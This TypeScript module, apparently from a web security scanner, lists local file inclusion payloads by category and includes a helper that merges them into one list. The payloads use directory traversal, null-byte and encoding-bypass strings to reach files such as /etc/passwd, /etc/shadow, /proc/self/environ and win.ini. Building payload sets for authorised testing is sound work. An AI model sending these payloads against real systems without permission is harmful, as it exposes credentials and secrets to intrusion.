export type LfiPayloadCategoryId =
  | 'basic-traversal'
  | 'deep-traversal'
  | 'null-byte'
  | 'encoding-bypass'
  | 'os-linux'
  | 'os-windows'

export interface LfiPayloadCategory {
  id: LfiPayloadCategoryId
  label: string
  description: string
  payloads: string[]
}

export const LFI_PAYLOAD_CATEGORIES: LfiPayloadCategory[] = [
  {
    id: 'basic-traversal',
    label: 'Basic Traversal',
    description: 'Simple directory traversal to common sensitive files',
    payloads: [
      '../etc/passwd',
      '../../etc/passwd',
      '../etc/hosts',
      '../../etc/hosts',
      '../proc/self/environ',
      '../../proc/self/environ'
    ]
  },
  {
    id: 'deep-traversal',
    label: 'Deep Traversal',
    description: 'Deeper traversal chains for robust path resolution',
    payloads: [
      '../../../../etc/passwd',
      '../../../../../etc/passwd',
      '../../../../etc/hosts',
      '../../../../../etc/hosts',
      '../../../../proc/self/environ',
      '../../../../../proc/self/environ',
      '../../../../windows/win.ini',
      '../../../../../windows/win.ini'
    ]
  },
  {
    id: 'null-byte',
    label: 'Null Byte Variations',
    description: 'Null byte suffixes to bypass extensions or filters',
    payloads: [
      '../../etc/passwd%00',
      '../../etc/passwd%2500',
      '../../../../etc/passwd%00',
      '../../../../etc/passwd%2500'
    ]
  },
  {
    id: 'encoding-bypass',
    label: 'Encoding Bypass',
    description: 'URL-encoded and double-encoded traversal sequences',
    payloads: [
      '..%2f..%2fetc%2fpasswd',
      '..%2F..%2Fetc%2Fpasswd',
      '%2e%2e/%2e%2e/etc/passwd',
      '..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%afetc%c0%afpasswd'
    ]
  },
  {
    id: 'os-linux',
    label: 'OS-Specific (Linux)',
    description: 'Linux-specific sensitive files',
    payloads: [
      '/etc/passwd',
      '/etc/shadow',
      '/etc/hosts',
      '/proc/self/environ',
      '/proc/version'
    ]
  },
  {
    id: 'os-windows',
    label: 'OS-Specific (Windows)',
    description: 'Windows-specific configuration and hosts files',
    payloads: [
      'C:/Windows/win.ini',
      'C:/windows/win.ini',
      'C:/Windows/System32/drivers/etc/hosts',
      'C:/windows/system32/drivers/etc/hosts',
      'C:/boot.ini'
    ]
  }
]

/**
 * Build a flat, de-duplicated list of LFI payloads
 * from the configured categories. If no category IDs are
 * provided, all categories are included.
 */
export const buildLfiPayloadList = (
  categoryIds?: LfiPayloadCategoryId[]
): string[] => {
  const categoriesToUse =
    categoryIds && categoryIds.length > 0
      ? LFI_PAYLOAD_CATEGORIES.filter((c) => categoryIds.includes(c.id))
      : LFI_PAYLOAD_CATEGORIES

  const all = categoriesToUse.flatMap((c) => c.payloads)
  return Array.from(new Set(all))
}

